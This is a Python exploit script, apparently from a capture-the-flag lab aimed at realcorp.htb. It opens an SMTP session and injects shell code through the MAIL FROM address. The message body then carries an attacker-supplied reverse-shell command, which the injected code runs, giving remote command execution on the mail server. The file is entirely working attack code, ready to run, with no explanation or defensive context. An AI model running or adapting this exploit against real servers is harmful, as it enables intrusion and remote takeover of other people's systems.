#!/usr/bin/env python3
import socket, time
import sys

if len(sys.argv) < 4:
    print("usage: getshell.py <host> <port> <command>")
    exit()

HOST = sys.argv[1]
PORT = int(sys.argv[2])
rev_shell_cmd = sys.argv[3]

payload = b"""\r\n

#0\r\n
#1\r\n
#2\r\n
#3\r\n
#4\r\n
#5\r\n
#6\r\n
#7\r\n
#8\r\n
#9\r\n
#a\r\n
#b\r\n 
#c\r\n
#d\r\n
""" + rev_shell_cmd.encode() + b"""
.
"""
for res in socket.getaddrinfo(HOST, PORT, socket.AF_UNSPEC, socket.SOCK_STREAM):
    af, socktype, proto, canonname, sa = res
    try:
        s = socket.socket(af, socktype, proto)
    except OSError as msg:
        s = None
        continue
    try:
        s.connect(sa)
    except OSError as msg:
        s.close()
        s = None
        continue
    break
if s is None:
    print("Could not open socket")
    sys.exit(1)
with s:
    data = s.recv(1024)
    print('Received', repr(data))
    time.sleep(1)
    print('SENDING HELO')
    s.send(b"helo test.com\r\n")
    data = s.recv(1024)
    print('RECIEVED', repr(data))
    s.send(b"MAIL FROM:<;for i in 0 1 2 3 4 5 6 7 8 9 a b c d;do read r;done;sh;exit 0;>\r\n")
    time.sleep(1)
    data = s.recv(1024)
    print('RECIEVED', repr(data))
    s.send(b"RCPT TO:<j.nakazawa@realcorp.htb>\r\n")
    data = s.recv(1024)
    print('RECIEVED', repr(data))
    s.send(b"DATA\r\n")
    data = s.recv(1024)
    print('RECIEVED', repr(data))
    s.send(payload)
    data = s.recv(1024)
    print('RECIEVED', repr(data))
    s.send(b"QUIT\r\n")
    data = s.recv(1024)
    print('RECIEVED', repr(data))
print("Exploited")
s.close()